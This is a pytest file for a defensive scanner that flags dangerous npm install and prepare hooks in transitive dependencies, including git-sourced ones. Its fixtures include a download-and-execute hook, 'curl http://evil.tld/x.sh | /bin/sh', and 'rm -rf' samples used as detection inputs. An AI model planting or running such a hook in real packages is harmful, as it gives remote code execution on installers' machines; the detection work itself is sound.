"""Tests for ``sandbox_deps`` — installed-dependency lifecycle hooks (F34).

``sandbox <pkg>`` ran ``analyze_install_scripts`` over the **target** package's
``scripts`` block only, from ``npm view``. Phase 5 read the installed code but
deliberately treats ``package.json`` as data, not scannable source. So the
``preinstall`` / ``install`` / ``postinstall`` hooks of the **transitive**
packages npm installed — every one of which already executed during phase 3 —
had nobody looking at them, and the user was shown "✓ No install scripts" for the
package they named while a dependency four levels down ran ``curl … | sh``.

:func:`test_phase_five_walk_reads_none_of_the_dependency_manifests` is the
fail-first proof that the gap was real: the phase-5 walk finds **zero** hits for a
transitive dependency whose ``postinstall`` is an outright download-and-execute.

The precision of the pass rests on two calibrations, both pinned here:

* :func:`is_installed_package_manifest` accepts only what npm actually
  *installed*. A ``package.json`` in a package's own test fixtures is not an
  installed package and its hooks never run, so reporting it would be a false
  positive on every package that ships integration tests.
* ``prepare`` is not an auto-run hook for a registry dependency. Measured over
  **44,980 real installed packages** across 102 ``node_modules`` trees, this pass
  produced exactly two danger lines: ``faiss-node``'s ``install`` hook (a true
  positive — it clones and builds from GitHub) and ``remix-island``'s ``prepare``
  hook, whose ``rm -rf dist && npm run build`` never runs on a consumer's
  machine. Excluding ``prepare`` from the executed set leaves **one danger over
  44,980 packages, and it is real**.

F36 closes the one shape that calibration was blind to: npm *does* run
``prepare`` for a dependency given as a **git URL**, because it builds it from
source. Verified against the real npm (11.9.0) rather than assumed — installing
a local git package whose ``prepare`` writes a marker file produced that marker,
while the same install left the hook untouched from a registry tarball. The
lockfile is the only thing that can tell the two apart, so the sandbox install
must stop suppressing it: ``--no-save`` writes no ``package-lock.json`` at all,
which is why :func:`test_cli_install_lets_npm_write_the_lockfile` guards the
argv. Both provenance shapes below are the real ones npm emitted —
``git+file://…#<sha>`` and ``https://registry.npmjs.org/…``.
"""

import ast
import json
from pathlib import Path

import pytest

import sandbox_deps
from sandbox_codescan import scan_installed_package_code
from sandbox_deps import (
    AUTO_RUN_DEPENDENCY_HOOKS,
    GIT_SOURCE_HOOK,
    LOCKFILE_NAME,
    MAX_LOCKFILE_DEPTH,
    MAX_UNREADABLE_EXAMPLES,
    DependencyScriptReport,
    InstallSourceIndex,
    InstalledPackageScripts,
    collect_installed_manifests,
    format_hooked_package_line,
    is_installed_package_manifest,
    load_install_source_index,
    lockfile_key_to_package_dir,
    qualify_dependency_danger,
    scan_installed_dependency_scripts,
)

#: A postinstall hook that is unambiguously malicious under the existing table.
MALICIOUS_HOOK = "curl http://evil.tld/x.sh | /bin/sh"

#: The shape the overwhelming majority of real install hooks have.
BENIGN_HOOKS = (
    "node-gyp rebuild",
    "prebuild-install || node-gyp rebuild",
    "patch-package",
    "node scripts/postinstall.js",
    "husky install",
    "opencollective-postinstall || exit 0",
    "node-pre-gyp install --fallback-to-build",
)


#: What npm 11.9.0 actually wrote to `resolved` for a git dependency, copied from
#: the real lockfile the F36 verification install produced.
GIT_RESOLVED = (
    "git+file://C:/Users/x/AppData/Local/Temp/f36probe/gitdep"
    "#56598265a92c16e6c0617ff1fa24aa2581062dd7"
)

#: The same field for a registry tarball — the shape that must never be read as
#: a git checkout, or F34's calibration is undone.
REGISTRY_RESOLVED = "https://registry.npmjs.org/lodash/-/lodash-4.18.1.tgz"


def install_package(root: Path, package_dir: str, scripts=None, **extra) -> Path:
    """Write an installed package manifest under a ``node_modules`` root."""
    directory = root / package_dir
    directory.mkdir(parents=True, exist_ok=True)
    manifest = {"name": package_dir.rsplit("/", 1)[-1], "version": "1.0.0", **extra}
    if scripts is not None:
        manifest["scripts"] = scripts
    (directory / "package.json").write_text(json.dumps(manifest), encoding="utf-8")
    return directory


def write_lockfile(project_root: Path, body: dict) -> Path:
    """Write a ``package-lock.json`` at the sandbox project root."""
    project_root.mkdir(parents=True, exist_ok=True)
    lockfile = project_root / LOCKFILE_NAME
    lockfile.write_text(json.dumps(body), encoding="utf-8")
    return lockfile


def v3_lockfile(entries: dict) -> dict:
    """A ``lockfileVersion`` 3 document, keyed the way npm keys one.

    ``entries`` maps an installed directory (``lodash``, ``a/node_modules/b``) to
    its ``resolved`` value; the empty root entry npm always writes is included so
    the fixture exercises the "not an installed package" rejection too.
    """
    packages = {"": {"name": "shellockolm-sandbox", "version": "1.0.0"}}
    for package_dir, resolved in entries.items():
        packages[f"node_modules/{package_dir}"] = {
            "version": "1.0.0",
            "resolved": resolved,
        }
    return {"name": "shellockolm-sandbox", "lockfileVersion": 3, "packages": packages}


# ---------------------------------------------------------------------------
# Fail-first: the gap this task exists to close
# ---------------------------------------------------------------------------


def test_phase_five_walk_reads_none_of_the_dependency_manifests(tmp_path):
    """The proof the hooks were invisible: phase 5 never reads a manifest.

    A transitive dependency whose ``postinstall`` is a download-and-execute is
    entirely absent from the deep-code report, because ``package.json`` is not
    scannable source — and nothing else looked at it either.
    """
    node_modules = tmp_path / "node_modules"
    install_package(node_modules, "evil-dep", scripts={"postinstall": MALICIOUS_HOOK})

    code_report = scan_installed_package_code(node_modules)

    assert code_report.hits == []
    assert code_report.files_scanned == 0

    # The new pass sees exactly what phase 5 structurally cannot.
    dep_report = scan_installed_dependency_scripts(node_modules)

    assert dep_report.dangers
    assert any("evil-dep" in danger for danger in dep_report.dangers)


# ---------------------------------------------------------------------------
# The pure rule: what npm actually installed
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "relative",
    [
        "lodash/package.json",
        "@babel/core/package.json",
        "foo/node_modules/bar/package.json",
        "@a/b/node_modules/@c/d/package.json",
        "foo/node_modules/@scope/nested/package.json",
        "@scope/pkg/node_modules/dep/package.json",
    ],
)
def test_installed_package_manifests_are_recognized(relative):
    assert is_installed_package_manifest(relative) is True


@pytest.mark.parametrize(
    "relative",
    [
        # A package's own source tree: npm never runs these hooks.
        "foo/test/fixtures/package.json",
        "foo/examples/demo/package.json",
        "foo/dist/package.json",
        "@scope/pkg/fixtures/package.json",
        # npm's own bookkeeping directories are not packages.
        ".bin/package.json",
        ".cache/nested/package.json",
        ".pnpm/lodash@4.17.21/package.json",
        # Malformed chains.
        "foo/node_modules/package.json",
        "@scope/package.json",
        "@/pkg/package.json",
        "node_modules/package.json",
        "package.json",
        # Not a manifest at all.
        "lodash/index.js",
        "lodash/package.json.bak",
        "",
    ],
)
def test_non_installed_manifests_are_rejected(relative):
    assert is_installed_package_manifest(relative) is False


def test_fixture_manifest_rejection_is_the_precision_of_the_pass(tmp_path):
    """A package shipping integration fixtures must not be reported.

    ``foo/test/fixtures/package.json`` can declare any hook it likes; npm never
    installs it, so it never runs. Counting it would fire on a large share of
    real packages.
    """
    node_modules = tmp_path / "node_modules"
    install_package(node_modules, "foo", scripts={"postinstall": "node ok.js"})
    fixture = node_modules / "foo" / "test" / "fixtures"
    fixture.mkdir(parents=True)
    (fixture / "package.json").write_text(
        json.dumps({"name": "fixture", "scripts": {"postinstall": MALICIOUS_HOOK}}),
        encoding="utf-8",
    )

    report = scan_installed_dependency_scripts(node_modules)

    assert report.packages_scanned == 1
    assert report.dangers == []


def test_windows_separators_are_normalized():
    assert is_installed_package_manifest(r"foo\node_modules\bar\package.json") is True


# ---------------------------------------------------------------------------
# The walk
# ---------------------------------------------------------------------------


def test_walk_finds_top_level_scoped_and_nested_packages(tmp_path):
    node_modules = tmp_path / "node_modules"
    install_package(node_modules, "lodash")
    install_package(node_modules, "@babel/core")
    install_package(node_modules, "foo")
    install_package(node_modules, "foo/node_modules/bar")

    manifests, dir_errors = collect_installed_manifests(node_modules)

    assert dir_errors == 0
    assert [package_dir for package_dir, _path in manifests] == [
        "@babel/core",
        "foo",
        "foo/node_modules/bar",
        "lodash",
    ]


def test_walk_skips_npm_bookkeeping_directories(tmp_path):
    node_modules = tmp_path / "node_modules"
    install_package(node_modules, "lodash")
    bin_dir = node_modules / ".bin"
    bin_dir.mkdir(parents=True)
    (bin_dir / "package.json").write_text('{"scripts": {"postinstall": "x"}}')

    manifests, _dir_errors = collect_installed_manifests(node_modules)

    assert [package_dir for package_dir, _path in manifests] == ["lodash"]


def test_walk_counts_a_directory_it_cannot_list(tmp_path, monkeypatch):
    node_modules = tmp_path / "node_modules"
    install_package(node_modules, "lodash")
    real_listdir = sandbox_deps.os.listdir

    def exploding_listdir(path):
        raise PermissionError("denied")

    monkeypatch.setattr(sandbox_deps.os, "listdir", exploding_listdir)
    manifests, dir_errors = collect_installed_manifests(node_modules)
    monkeypatch.setattr(sandbox_deps.os, "listdir", real_listdir)

    assert manifests == []
    assert dir_errors == 1


def test_walk_terminates_on_a_self_referential_node_modules(tmp_path):
    """npm workspaces and `npm link` create directory links; a cycle must not hang."""
    node_modules = tmp_path / "node_modules"
    package = install_package(node_modules, "loopy")
    try:
        (package / "node_modules").symlink_to(node_modules, target_is_directory=True)
    except (OSError, NotImplementedError):  # pragma: no cover - needs privilege
        pytest.skip("cannot create a directory symlink on this machine")

    manifests, _dir_errors = collect_installed_manifests(node_modules)

    # Reached once via each path, never endlessly.
    assert len(manifests) == len({package_dir for package_dir, _p in manifests})
    assert any(package_dir.endswith("loopy") for package_dir, _p in manifests)


def test_walk_prunes_a_directory_it_has_already_visited(tmp_path, monkeypatch):
    """The cycle guard, without needing symlink privilege.

    Collapsing two distinct paths onto one real path is exactly what a junction
    or a linked workspace does. The nested tree must then be visited once, not
    re-entered — the symlink test above proves the same thing on a machine that
    can create one, but skips where Windows withholds the privilege.
    """
    node_modules = tmp_path / "node_modules"
    install_package(node_modules, "a")
    install_package(node_modules, "a/node_modules/b")

    real_realpath = sandbox_deps.os.path.realpath

    def collapsing_realpath(path):
        resolved = real_realpath(path)
        # Every node_modules directory in this tree looks like the same one.
        return real_realpath(node_modules) if str(path).endswith("node_modules") else resolved

    monkeypatch.setattr(sandbox_deps.os.path, "realpath", collapsing_realpath)
    manifests, dir_errors = collect_installed_manifests(node_modules)

    assert dir_errors == 0
    assert [package_dir for package_dir, _path in manifests] == ["a"]


def test_missing_node_modules_is_reported_blind(tmp_path):
    report = scan_installed_dependency_scripts(tmp_path / "node_modules")

    assert report.packages_found == 0
    assert report.blind_reason() is not None
    assert "NOT analyzed" in report.blind_reason()


# ---------------------------------------------------------------------------
# Detection
# ---------------------------------------------------------------------------


def test_malicious_transitive_hook_is_detected_and_named(tmp_path):
    node_modules = tmp_path / "node_modules"
    install_package(node_modules, "safe-top")
    install_package(
        node_modules,
        "safe-top/node_modules/evil",
        scripts={"postinstall": MALICIOUS_HOOK},
    )

    report = scan_installed_dependency_scripts(node_modules)

    assert report.executed_count == 1
    assert report.dangers
    assert all("dependency evil@1.0.0" in danger for danger in report.dangers)
    assert report.blind_reason() is None


@pytest.mark.parametrize("hook", AUTO_RUN_DEPENDENCY_HOOKS)
def test_every_auto_run_hook_is_analyzed(tmp_path, hook):
    node_modules = tmp_path / "node_modules"
    install_package(node_modules, "evil", scripts={hook: MALICIOUS_HOOK})

    report = scan_installed_dependency_scripts(node_modules)

    assert report.dangers
    assert report.with_hooks[0].auto_run_hooks == [hook]


@pytest.mark.parametrize("body", BENIGN_HOOKS)
def test_benign_install_hooks_produce_no_danger(tmp_path, body):
    node_modules = tmp_path / "node_modules"
    install_package(node_modules, "ordinary", scripts={"postinstall": body})

    report = scan_installed_dependency_scripts(node_modules)

    assert report.dangers == []
    assert report.executed_count == 1
    assert report.blind_reason() is None


def test_a_package_with_no_hooks_is_scanned_and_silent(tmp_path):
    node_modules = tmp_path / "node_modules"
    install_package(node_modules, "quiet", scripts={"test": "jest", "build": "tsc"})

    report = scan_installed_dependency_scripts(node_modules)

    assert report.packages_scanned == 1
    assert report.with_hooks == []
    assert report.blind_reason() is None


# ---------------------------------------------------------------------------
# The `prepare` calibration
# ---------------------------------------------------------------------------


def test_prepare_only_package_is_listed_but_never_a_danger(tmp_path):
    """The measured false positive: `remix-island`'s `rm -rf dist && npm run build`.

    npm does not run ``prepare`` for a dependency installed from a registry
    tarball, so the script never executed and must not be reported as if it had.
    """
    node_modules = tmp_path / "node_modules"
    install_package(
        node_modules, "remix-island", scripts={"prepare": "rm -rf dist && npm run build"}
    )

    report = scan_installed_dependency_scripts(node_modules)

    assert report.dangers == []
    assert report.hooked_count == 1
    assert report.executed_count == 0
    entry = report.with_hooks[0]
    assert entry.hooks == ["prepare"]
    assert entry.auto_run_hooks == []
    assert entry.executed is False


def test_prepare_does_not_mask_a_dangerous_postinstall(tmp_path):
    """Calibration guard: narrowing the hook set was not paid for with detection."""
    node_modules = tmp_path / "node_modules"
    install_package(
        node_modules,
        "two-faced",
        scripts={"prepare": "rm -rf dist", "postinstall": MALICIOUS_HOOK},
    )

    report = scan_installed_dependency_scripts(node_modules)

    entry = report.with_hooks[0]
    assert entry.hooks == ["postinstall", "prepare"]
    assert entry.auto_run_hooks == ["postinstall"]
    assert report.dangers
    assert all("postinstall" in danger for danger in report.dangers)


def test_prepare_is_not_in_the_auto_run_set():
    assert "prepare" not in AUTO_RUN_DEPENDENCY_HOOKS
    assert set(AUTO_RUN_DEPENDENCY_HOOKS) == {"preinstall", "install", "postinstall"}


# ---------------------------------------------------------------------------
# F36 — where each package came from decides whether `prepare` ran
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "key,expected",
    [
        ("node_modules/lodash", "lodash"),
        ("node_modules/@babel/core", "@babel/core"),
        ("node_modules/a/node_modules/b", "a/node_modules/b"),
        ("node_modules/@a/b/node_modules/@c/d", "@a/b/node_modules/@c/d"),
        (r"node_modules\lodash", "lodash"),
    ],
)
def test_lockfile_keys_map_to_installed_directories(key, expected):
    assert lockfile_key_to_package_dir(key) == expected


@pytest.mark.parametrize(
    "key",
    [
        "",  # the root project entry npm always writes
        "packages/app",  # a workspace, not an installed package
        "node_modules",
        "node_modules/",
        "node_modules/.bin",
        "lodash",  # a bare name is not a lockfile key
    ],
)
def test_non_package_lockfile_keys_are_rejected(key):
    """The lockfile side and the filesystem side must agree on what a package is."""
    assert lockfile_key_to_package_dir(key) is None


def test_v3_lockfile_indexes_a_git_sourced_package(tmp_path):
    write_lockfile(tmp_path, v3_lockfile({"gitdep": GIT_RESOLVED}))

    index = load_install_source_index(tmp_path)

    assert index.is_authoritative
    assert index.git_sourced == frozenset({"gitdep"})


def test_registry_entries_are_never_read_as_git(tmp_path):
    """The F34 calibration survives: a tarball is not a checkout."""
    write_lockfile(
        tmp_path, v3_lockfile({"lodash": REGISTRY_RESOLVED, "left-pad": REGISTRY_RESOLVED})
    )

    index = load_install_source_index(tmp_path)

    assert index.is_authoritative
    assert index.git_sourced == frozenset()


@pytest.mark.parametrize(
    "resolved",
    [
        "git+ssh://git@github.com/owner/repo.git#0123456789abcdef",
        "git+https://github.com/owner/repo.git#0123456789abcdef",
        "git://github.com/owner/repo.git",
        GIT_RESOLVED,
    ],
)
def test_every_git_url_form_npm_normalizes_to_is_recognized(tmp_path, resolved):
    write_lockfile(tmp_path, v3_lockfile({"dep": resolved}))

    assert load_install_source_index(tmp_path).git_sourced == frozenset({"dep"})


def test_v1_lockfile_tree_is_walked(tmp_path):
    """114 of the 559 lockfiles measured are still v1, so this path is not legacy."""
    write_lockfile(
        tmp_path,
        {
            "lockfileVersion": 1,
            "dependencies": {
                "top": {
                    "version": REGISTRY_RESOLVED,
                    "dependencies": {"nested": {"version": GIT_RESOLVED}},
                },
                "gitdep": {"from": GIT_RESOLVED, "resolved": GIT_RESOLVED},
            },
        },
    )

    index = load_install_source_index(tmp_path)

    assert index.is_authoritative
    assert index.git_sourced == frozenset({"gitdep", "top/node_modules/nested"})


def test_v2_prefers_the_flat_packages_map(tmp_path):
    """v2 carries both layouts; the map is the one npm keeps accurate."""
    body = v3_lockfile({"dep": REGISTRY_RESOLVED})
    body["lockfileVersion"] = 2
    body["dependencies"] = {"dep": {"version": GIT_RESOLVED}}

    write_lockfile(tmp_path, body)

    assert load_install_source_index(tmp_path).git_sourced == frozenset()


def test_deeply_nested_v1_tree_is_bounded(tmp_path):
    """A lockfile is untrusted input; nesting must not make the walk unbounded."""
    innermost = {"version": GIT_RESOLVED}
    node = innermost
    for _ in range(MAX_LOCKFILE_DEPTH + 20):
        node = {"pkg": {"version": REGISTRY_RESOLVED, "dependencies": node}}
    write_lockfile(tmp_path, {"lockfileVersion": 1, "dependencies": node})

    index = load_install_source_index(tmp_path)

    # Completes rather than recursing forever, and stays authoritative.
    assert index.is_authoritative


def test_missing_lockfile_is_unavailable_not_empty(tmp_path):
    """"No git dependencies" and "unknown" are different answers."""
    index = load_install_source_index(tmp_path)

    assert index.is_authoritative is False
    assert index.unavailable_reason
    assert index.git_sourced == frozenset()


def test_unreadable_lockfile_is_unavailable(tmp_path, monkeypatch):
    write_lockfile(tmp_path, v3_lockfile({"dep": GIT_RESOLVED}))

    def exploding_read(path):
        raise PermissionError("denied")

    monkeypatch.setattr(sandbox_deps, "read_lockfile", exploding_read)
    index = load_install_source_index(tmp_path)

    assert index.is_authoritative is False
    assert "denied" in index.unavailable_reason


def test_unparseable_lockfile_is_unavailable(tmp_path):
    (tmp_path / LOCKFILE_NAME).write_text("{not json", encoding="utf-8")

    index = load_install_source_index(tmp_path)

    assert index.is_authoritative is False
    assert "could not be parsed" in index.unavailable_reason


def test_non_object_lockfile_is_unavailable(tmp_path):
    (tmp_path / LOCKFILE_NAME).write_text('["a", "list"]', encoding="utf-8")

    index = load_install_source_index(tmp_path)

    assert index.is_authoritative is False
    assert "not an object" in index.unavailable_reason


def test_auto_run_hooks_adds_prepare_only_for_a_git_sourced_package():
    index = InstallSourceIndex(git_sourced=frozenset({"gitdep"}))

    assert index.auto_run_hooks("gitdep") == AUTO_RUN_DEPENDENCY_HOOKS + (GIT_SOURCE_HOOK,)
    assert index.auto_run_hooks("lodash") == AUTO_RUN_DEPENDENCY_HOOKS


# --- the fix, end to end ---------------------------------------------------


def test_git_sourced_prepare_hook_is_reported_as_executed(tmp_path):
    """The F36 bug: this hook RAN on the user's machine and was reported as not run.

    Verified against the real npm before it was written: installing a local git
    package whose ``prepare`` writes a marker file produced that marker.
    """
    node_modules = tmp_path / "node_modules"
    install_package(node_modules, "gitdep", scripts={"prepare": MALICIOUS_HOOK})
    write_lockfile(tmp_path, v3_lockfile({"gitdep": GIT_RESOLVED}))

    report = scan_installed_dependency_scripts(
        node_modules, install_sources=load_install_source_index(tmp_path)
    )

    entry = report.with_hooks[0]
    assert entry.git_sourced is True
    assert entry.auto_run_hooks == [GIT_SOURCE_HOOK]
    assert entry.executed is True
    assert report.dangers
    assert all("dependency gitdep@1.0.0" in danger for danger in report.dangers)
    assert report.git_sourced_count == 1
    assert report.blind_reason() is None


def test_the_same_package_from_the_registry_is_still_not_a_danger(tmp_path):
    """The zero-false-positive baseline: only the provenance differs from above."""
    node_modules = tmp_path / "node_modules"
    install_package(node_modules, "gitdep", scripts={"prepare": MALICIOUS_HOOK})
    write_lockfile(tmp_path, v3_lockfile({"gitdep": REGISTRY_RESOLVED}))

    report = scan_installed_dependency_scripts(
        node_modules, install_sources=load_install_source_index(tmp_path)
    )

    entry = report.with_hooks[0]
    assert entry.git_sourced is False
    assert entry.auto_run_hooks == []
    assert entry.executed is False
    assert report.dangers == []
    assert report.blind_reason() is None


@pytest.mark.parametrize("body", ["tsc -p .", "husky", "npm run build", "node-gyp rebuild"])
def test_a_git_sourced_benign_prepare_is_not_a_danger(tmp_path, body):
    """Promoting the hook must not turn every built-from-source package into a finding.

    The ordinary ``prepare`` body is a build step, and a build step executing is
    not a finding — only the danger table's contents are.
    """
    node_modules = tmp_path / "node_modules"
    install_package(node_modules, "gitdep", scripts={"prepare": body})
    write_lockfile(tmp_path, v3_lockfile({"gitdep": GIT_RESOLVED}))

    report = scan_installed_dependency_scripts(
        node_modules, install_sources=load_install_source_index(tmp_path)
    )

    assert report.dangers == []
    assert report.with_hooks[0].git_sourced is True
    assert report.with_hooks[0].executed is True


def test_the_f34_calibration_case_inverts_when_the_package_is_git_sourced(tmp_path):
    """``remix-island``'s ``rm -rf dist && npm run build``, read both ways.

    F34 measured this exact hook as the pass's only false positive and excluded
    ``prepare`` to remove it — correct for the registry tarball it was installed
    from, where the script never ran. Installed from a git URL the same script
    genuinely deletes a directory on the user's machine, so the same body is a
    finding. That inversion IS F36: the hook body never decided this, the
    provenance did.

    (The line it produces, "Destructive file operation (rm -rf)", is the flat
    danger table F37 proposes to tier; F36 only decides whether it is consulted.)
    """
    hook = {"prepare": "rm -rf dist && npm run build"}

    registry_root = tmp_path / "registry"
    install_package(registry_root / "node_modules", "remix-island", scripts=hook)
    write_lockfile(registry_root, v3_lockfile({"remix-island": REGISTRY_RESOLVED}))
    registry = scan_installed_dependency_scripts(
        registry_root / "node_modules",
        install_sources=load_install_source_index(registry_root),
    )

    git_root = tmp_path / "git"
    install_package(git_root / "node_modules", "remix-island", scripts=hook)
    write_lockfile(git_root, v3_lockfile({"remix-island": GIT_RESOLVED}))
    from_git = scan_installed_dependency_scripts(
        git_root / "node_modules",
        install_sources=load_install_source_index(git_root),
    )

    assert registry.dangers == []
    assert from_git.dangers
    assert all("rm -rf" in danger for danger in from_git.dangers)


def test_git_provenance_applies_to_the_named_package_only(tmp_path):
    """One git dependency must not promote `prepare` for the whole tree."""
    node_modules = tmp_path / "node_modules"
    install_package(node_modules, "gitdep", scripts={"prepare": MALICIOUS_HOOK})
    install_package(node_modules, "tarball", scripts={"prepare": MALICIOUS_HOOK})
    write_lockfile(
        tmp_path,
        v3_lockfile({"gitdep": GIT_RESOLVED, "tarball": REGISTRY_RESOLVED}),
    )

    report = scan_installed_dependency_scripts(
        node_modules, install_sources=load_install_source_index(tmp_path)
    )

    assert report.dangers
    assert all("dependency gitdep@1.0.0" in danger for danger in report.dangers)
    assert not any("tarball" in danger for danger in report.dangers)
    assert report.git_sourced_count == 1
    assert report.executed_count == 1


def test_a_nested_git_dependency_is_matched_by_its_installed_directory(tmp_path):
    """The lockfile key and the walk key have to be the same string."""
    node_modules = tmp_path / "node_modules"
    install_package(node_modules, "top")
    install_package(
        node_modules, "top/node_modules/inner", scripts={"prepare": MALICIOUS_HOOK}
    )
    write_lockfile(tmp_path, v3_lockfile({"top/node_modules/inner": GIT_RESOLVED}))

    report = scan_installed_dependency_scripts(
        node_modules, install_sources=load_install_source_index(tmp_path)
    )

    assert report.dangers
    assert report.with_hooks[0].git_sourced is True


def test_a_git_sourced_postinstall_is_unchanged(tmp_path):
    """Provenance only ever adds `prepare`; the registry hooks are unconditional."""
    node_modules = tmp_path / "node_modules"
    install_package(node_modules, "gitdep", scripts={"postinstall": MALICIOUS_HOOK})
    write_lockfile(tmp_path, v3_lockfile({"gitdep": GIT_RESOLVED}))

    report = scan_installed_dependency_scripts(
        node_modules, install_sources=load_install_source_index(tmp_path)
    )

    assert report.with_hooks[0].auto_run_hooks == ["postinstall"]
    assert report.dangers


# --- the honest third state ------------------------------------------------


def test_a_prepare_hook_with_no_lockfile_is_blind_not_a_pass(tmp_path):
    """Unknown provenance cannot claim the hook did not run."""
    node_modules = tmp_path / "node_modules"
    install_package(node_modules, "maybe", scripts={"prepare": MALICIOUS_HOOK})

    report = scan_installed_dependency_scripts(
        node_modules, install_sources=load_install_source_index(tmp_path)
    )

    entry = report.with_hooks[0]
    assert entry.source_unverified is True
    assert entry.git_sourced is False
    assert report.source_unverified_count == 1
    reason = report.blind_reason()
    assert reason is not None
    assert GIT_SOURCE_HOOK in reason
    assert "NOT determined" in reason


def test_an_absent_lockfile_alone_does_not_make_the_pass_blind(tmp_path):
    """Narrow by design: no `prepare` declared means nothing was at stake."""
    node_modules = tmp_path / "node_modules"
    install_package(node_modules, "ordinary", scripts={"postinstall": "node-gyp rebuild"})

    report = scan_installed_dependency_scripts(
        node_modules, install_sources=load_install_source_index(tmp_path)
    )

    assert report.source_unverified_count == 0
    assert report.blind_reason() is None


def test_omitting_the_index_entirely_is_treated_as_unknown(tmp_path):
    """A caller that forgets the lockfile must not silently get "registry"."""
    node_modules = tmp_path / "node_modules"
    install_package(node_modules, "maybe", scripts={"prepare": MALICIOUS_HOOK})

    report = scan_installed_dependency_scripts(node_modules)

    assert report.with_hooks[0].source_unverified is True
    assert report.blind_reason() is not None


def test_an_authoritative_lockfile_leaves_a_registry_prepare_conclusive(tmp_path):
    node_modules = tmp_path / "node_modules"
    install_package(node_modules, "remix-island", scripts={"prepare": "rm -rf dist"})
    write_lockfile(tmp_path, v3_lockfile({"remix-island": REGISTRY_RESOLVED}))

    report = scan_installed_dependency_scripts(
        node_modules, install_sources=load_install_source_index(tmp_path)
    )

    assert report.with_hooks[0].source_unverified is False
    assert report.blind_reason() is None


def test_console_line_marks_a_package_built_from_git():
    entry = InstalledPackageScripts(
        package_dir="gitdep",
        name="gitdep",
        version="1.0.0",
        hooks=["prepare"],
        auto_run_hooks=["prepare"],
        git_sourced=True,
    )

    line = format_hooked_package_line(entry)

    assert "built from a git checkout" in line
    assert "not run" not in line


def test_console_line_marks_an_unverified_install_source():
    entry = InstalledPackageScripts(
        package_dir="maybe",
        name="maybe",
        version="1.0.0",
        hooks=["prepare"],
        source_unverified=True,
    )

    line = format_hooked_package_line(entry)

    assert "install source unverified" in line
    assert "not run for a registry install" not in line


# ---------------------------------------------------------------------------
# Exclusion of the target package
# ---------------------------------------------------------------------------


def test_target_package_can_be_excluded(tmp_path):
    node_modules = tmp_path / "node_modules"
    install_package(node_modules, "target", scripts={"postinstall": MALICIOUS_HOOK})
    install_package(node_modules, "dep", scripts={"postinstall": "node-gyp rebuild"})

    report = scan_installed_dependency_scripts(
        node_modules, exclude_dirs=frozenset({"target"})
    )

    assert report.packages_excluded == 1
    assert report.packages_scanned == 1
    assert report.dangers == []


def test_excluding_the_only_package_is_not_blind(tmp_path):
    """A target with no dependencies is a clean result, not an unseen one."""
    node_modules = tmp_path / "node_modules"
    install_package(node_modules, "solo")

    report = scan_installed_dependency_scripts(
        node_modules, exclude_dirs=frozenset({"solo"})
    )

    assert report.packages_found == 1
    assert report.packages_scanned == 0
    assert report.blind_reason() is None


def test_unexcluded_target_is_still_analyzed(tmp_path):
    """When phase 1 was blind, this pass is the target's only coverage."""
    node_modules = tmp_path / "node_modules"
    install_package(node_modules, "target", scripts={"postinstall": MALICIOUS_HOOK})

    report = scan_installed_dependency_scripts(node_modules)

    assert report.dangers


def test_scoped_target_exclusion_matches_the_installed_directory(tmp_path):
    node_modules = tmp_path / "node_modules"
    install_package(node_modules, "@scope/target", scripts={"install": MALICIOUS_HOOK})

    report = scan_installed_dependency_scripts(
        node_modules, exclude_dirs=frozenset({"@scope/target"})
    )

    assert report.packages_excluded == 1
    assert report.dangers == []


# ---------------------------------------------------------------------------
# Coverage: a manifest that could not be read is never a pass
# ---------------------------------------------------------------------------


def test_unreadable_manifest_is_counted_and_blind(tmp_path, monkeypatch):
    node_modules = tmp_path / "node_modules"
    install_package(node_modules, "unreadable")

    def exploding_read(path):
        raise PermissionError("denied")

    monkeypatch.setattr(sandbox_deps, "read_manifest", exploding_read)
    report = scan_installed_dependency_scripts(node_modules)

    assert report.manifests_unreadable == 1
    assert report.packages_scanned == 0
    assert report.unreadable_examples == [("unreadable", "denied")]
    assert "NOT analyzed" in report.blind_reason()


def test_unreadable_examples_are_capped(tmp_path, monkeypatch):
    node_modules = tmp_path / "node_modules"
    for index in range(MAX_UNREADABLE_EXAMPLES + 3):
        install_package(node_modules, f"pkg{index}")

    monkeypatch.setattr(
        sandbox_deps, "read_manifest", lambda path: (_ for _ in ()).throw(OSError("x"))
    )
    report = scan_installed_dependency_scripts(node_modules)

    assert report.manifests_unreadable == MAX_UNREADABLE_EXAMPLES + 3
    assert len(report.unreadable_examples) == MAX_UNREADABLE_EXAMPLES


def test_unparseable_manifest_is_counted_and_blind(tmp_path):
    node_modules = tmp_path / "node_modules"
    directory = node_modules / "broken"
    directory.mkdir(parents=True)
    (directory / "package.json").write_text("{not json", encoding="utf-8")

    report = scan_installed_dependency_scripts(node_modules)

    assert report.manifests_invalid == 1
    assert report.packages_scanned == 0
    assert "could not be parsed" in report.blind_reason()


def test_non_object_manifest_is_invalid(tmp_path):
    node_modules = tmp_path / "node_modules"
    directory = node_modules / "listy"
    directory.mkdir(parents=True)
    (directory / "package.json").write_text('["not", "an", "object"]', encoding="utf-8")

    report = scan_installed_dependency_scripts(node_modules)

    assert report.manifests_invalid == 1


def test_partial_coverage_is_reported_as_partial(tmp_path):
    node_modules = tmp_path / "node_modules"
    install_package(node_modules, "fine")
    broken = node_modules / "broken"
    broken.mkdir(parents=True)
    (broken / "package.json").write_text("{", encoding="utf-8")

    report = scan_installed_dependency_scripts(node_modules)

    assert report.packages_scanned == 1
    assert "partial" in report.blind_reason()


def test_a_scanned_tree_with_dependencies_is_not_blind(tmp_path):
    node_modules = tmp_path / "node_modules"
    install_package(node_modules, "a")
    install_package(node_modules, "b")

    report = scan_installed_dependency_scripts(node_modules)

    assert report.packages_scanned == 2
    assert report.blind_reason() is None


def test_blind_reason_names_every_failure_axis():
    report = DependencyScriptReport(
        packages_found=3,
        packages_scanned=1,
        manifests_unreadable=1,
        manifests_invalid=1,
        dir_errors=2,
    )

    reason = report.blind_reason()

    assert "unreadable" in reason
    assert "could not be parsed" in reason
    assert "could not be listed" in reason


# ---------------------------------------------------------------------------
# Reporting helpers
# ---------------------------------------------------------------------------


def test_danger_lines_name_the_dependency():
    qualified = qualify_dependency_danger(
        "evil@1.0.0", "🚨 postinstall script: Downloads external content (curl)"
    )

    assert qualified.startswith("🚨 ")
    assert "dependency evil@1.0.0" in qualified
    assert "postinstall script" in qualified


def test_danger_qualification_tolerates_an_unmarked_line():
    assert qualify_dependency_danger("x@1", "raw text") == "🚨 dependency x@1: raw text"


def test_label_falls_back_to_the_installed_directory():
    entry = InstalledPackageScripts(package_dir="foo/node_modules/anon")

